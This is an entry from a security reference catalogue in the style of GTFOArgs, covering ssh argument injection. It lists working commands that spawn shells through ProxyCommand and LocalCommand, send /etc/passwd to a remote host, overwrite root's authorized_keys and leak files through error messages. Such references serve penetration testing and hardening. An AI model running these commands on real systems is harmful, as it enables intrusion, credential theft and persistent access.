---
trust_level: community
id: argument-injection-ssh
namespace: argument:injection:ssh
name: ssh
description: "Argument injection via ssh"
version: "1.0.0"
capabilities:
  - security.execution.command
  - network.transfer.upload
  - network.transfer.download
  - system.file.read
platforms:
  - cross-platform
techniques:
  - execution
  - exfiltration
  - discovery
execution:
  template: "ssh"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "Spawn interactive shell on client. Does not require a successful connection."
    command: "ssh -o ProxyCommand=';sh 0<&2 1>&2' host
"
  - description: "Spawn interactive shell on client. Requires a successful connection towards `host`."
    command: "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host
"
  - description: "Sends a local file (`/etc/passwd`) to a remote SSH server and saves it in a location (`/tmp/out`)."
    command: "ssh host \"cat /tmp/out\" < /etc/passwd
"
  - description: "Retrieves a remote file from an SSH server (`/tmp/infile`) and saves it to a local destination (`/root/.ssh/authorized_keys`)."
    command: "ssh host \"cat /tmp/infile\" > /root/.ssh/authorized_keys
"
  - description: "Reads a file and outputs it in an error message."
    command: "ssh -F /etc/passwd host
"
  - description: "Does not require a successful connection."
    command: "ssh -o ProxyCommand=';uname -a 1>&2' host
"
references:
  - label: "GTFOArgs"
    url: "https://gtfoargs.github.io/gtfoargs/ssh/"
---

# ssh

GTFOArgs entry for ssh. This binary can be used to inject arguments for execution, file operations, or other capabilities.
